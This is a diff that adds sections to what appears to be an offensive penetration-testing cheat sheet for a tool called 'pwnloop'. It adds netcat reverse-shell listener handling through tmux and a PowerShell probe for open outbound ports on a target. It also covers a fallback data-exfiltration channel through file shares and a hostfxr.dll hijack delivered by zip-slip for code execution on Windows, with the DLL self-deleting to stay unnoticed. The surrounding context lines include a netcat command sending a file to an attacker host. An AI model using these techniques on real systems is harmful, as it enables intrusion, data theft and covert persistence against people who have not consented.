@@ -18,6 +18,20 @@ pwnloop x "rlwrap nc -lvnp 4444" &      # rlwrap gives arrow keys/history if pre
 pwnloop x "nc -lvnp 4444" &
 ```
 
+**A backgrounded `nc` has no stdin — a Windows/PowerShell reverse shell will land
+and then read as dead** because you cannot type into it. Hold the listener in a
+**tmux** session and drive it instead; this is the difference between "the
+payload failed" and a working shell:
+
+```bash
+pwnloop x 'tmux new-session -d -s sh "nc -lvnp 4444"'
+pwnloop x 'tmux send-keys -t sh "whoami" Enter; sleep 4; tmux capture-pane -p -t sh | tail'
+```
+
+Never send `C-c` to that pane — it kills the reverse shell (and, once the last
+window closes, the whole tmux server). Stop target-side processes with
+`taskkill /F /PID <pid>` from inside the shell, not with a pane interrupt.
+
 ## Reverse shells
 
 ```bash
@@ -88,6 +102,30 @@ nc LHOST 9001 < /path/file
 # or, small files, straight through the shell
 base64 -w0 /path/file      # then decode locally
 ```
+
+## When outbound is filtered (egress-limited targets)
+
+Test egress with ground truth before assuming a reverse shell can't leave —
+filtering is usually per-port, not total:
+
+```powershell
+445,139,80,8000,9001 | % { "$_ => " + (Test-NetConnection <LHOST> -Port $_ `
+   -WarningAction SilentlyContinue).TcpTestSucceeded }
+```
+
+Common pattern on hardened Windows: **`80/139/445` outbound blocked but high
+ports open** — a reverse shell on `9001` still works. If *all* TCP egress is
+shut, fall back to a **file-system channel**: write command output to a location
+the target already serves back to you (an anonymously-readable FTP/SMB share),
+and read it out-of-band. Slow but unblockable.
+
+**Arbitrary file write → RCE on Windows without a service:** if you can write
+into the directory of a .NET (Core) apphost `.exe` but cannot overwrite the exe
+itself (`ExtractToFile` refuses to clobber), drop an **app-local `hostfxr.dll`** —
+the apphost loads it in preference to the shared runtime, so your `DllMain` runs
+as the account behind that exe on its next launch. Have the DLL self-delete after
+firing so the app keeps working (and re-deliver to re-trigger). Classic delivery
+is a **zip-slip** (`..\app\hostfxr.dll` entry) into a scanner/upload queue.
 
 ## Stabilising access
 
